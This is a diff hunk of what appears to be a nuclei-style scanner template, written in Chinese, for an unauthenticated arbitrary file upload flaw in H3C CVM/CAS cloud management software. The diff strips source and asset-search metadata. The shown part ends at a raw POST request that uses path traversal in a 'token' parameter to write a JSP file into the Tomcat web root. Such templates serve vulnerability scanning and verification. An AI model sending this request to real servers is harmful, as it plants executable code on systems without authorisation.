@@ -3,14 +3,8 @@ info:
   name: H3CCVM前台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/6b50d217ed937ddba44d9227639b2cd5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 6b50d217ed937ddba44d9227639b2cd5
-    fofa: + hunter `app.name="H3C CAS 云服务"`
 http:
 - raw:
   - 'POST /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/stc.jsp&name=222 HTTP/1.1
